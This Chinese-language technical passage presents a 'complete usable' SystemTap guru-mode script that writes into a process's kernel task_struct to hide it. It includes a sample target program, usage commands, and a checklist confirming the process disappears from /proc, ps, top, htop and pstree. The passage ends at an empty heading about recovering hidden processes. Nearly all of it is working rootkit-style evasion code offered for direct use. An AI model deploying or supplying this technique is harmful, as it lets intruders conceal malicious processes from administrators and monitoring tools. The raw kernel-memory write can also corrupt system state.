### 完整可用脚本
```shell
#!/usr/bin/stap -g
# hide.stp

global pid;

function hide(who:long)
%{
    struct task_struct *target;

    target = pid_task(find_vpid(STAP_ARG_who), PIDTYPE_PID);
    target->pid = 0x7fffffff;
%}

probe begin
{
    pid = $1
    hide(pid);
    exit();
}
```

### 要隐藏的进程源码
文件名：test.c

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    while (1) {
        sleep(1);
        printf("tohide\n");
    }

    return 0;
}
```

### 脚本使用方法
```
第一个终端：
gcc test.c -o test
./test

第二个终端：
chmod 755 hide.stp
./hide.stp `pidof test`
```

### 验证方法
    1. /proc目录下看不到隐藏进程的目录
    2. ps命令无法看到隐藏进程
    3. pidof命令无法看到隐藏进程
    4. top命令无法看到隐藏进程
    5. htop命令无法看到隐藏进程
    6. pstree命令无法看到隐藏进程
    7. 以下命令无法看到隐藏进程信息
```shell
    for pid in $(ls /proc|awk '/^[0-9]+/{print $1}'); do 
        ls -l /proc/$pid/exe; 
    done
```

### 如何找回隐藏进程？
